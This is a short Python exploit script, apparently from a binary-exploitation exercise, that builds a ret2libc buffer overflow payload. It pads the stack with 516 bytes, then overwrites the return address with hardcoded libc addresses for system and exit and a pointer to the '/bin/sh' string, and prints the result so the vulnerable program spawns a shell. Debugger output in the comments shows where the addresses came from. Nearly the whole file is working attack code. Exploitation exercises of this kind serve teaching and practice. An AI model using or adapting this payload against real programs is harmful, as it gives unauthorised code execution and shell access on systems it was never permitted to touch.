#!/usr/bin/env python


from __future__ import print_function
import subprocess as sb
import struct
from functools import partial

import argparse


p32 = partial(struct.pack, "<I")


def get_args():
    parser = argparse.ArgumentParser(description="Exploit simple buffer overflow by ret2libc")

    args = parser.parse_args()

    return args


def assemble(asmcode):
    fln = "/tmp/tmp-rasm2.asm"
    open(fln, 'w').write(asmcode)
    payload = sb.Popen(["rasm2", "-a", "x86.nasm", "-Bf", fln], stdout=sb.PIPE).communicate()[0]

    return payload


def main():
    # pwndbg> search -s '/bin/sh'
    # libc-2.23.so    0xf7f6ea0b das     /* '/bin/sh' */
    arg_sh = 0xf7f6ea0b
    # pwndbg> print system
    # $2 = {<text variable, no debug info>} 0xf7e4dda0 <__libc_system>
    system_addr = 0xf7e4dda0
    # pwndbg> print exit
    # $2 = {<text variable, no debug info>} 0xf7e419d0 <__GI_exit>
    exit_addr = 0xf7e419d0

    # -----------------------
    # |0x0|          r2l func|
    # -----------------------
    # |0x4| retaddr from func|
    # -----------------------
    # |0x8|     arg1 for func|
    # -----------------------
    a = "a" * 512 + "b" * 4 + p32(system_addr) + p32(exit_addr) + p32(arg_sh)

    print(a, end='')


if __name__ == '__main__':
    main()
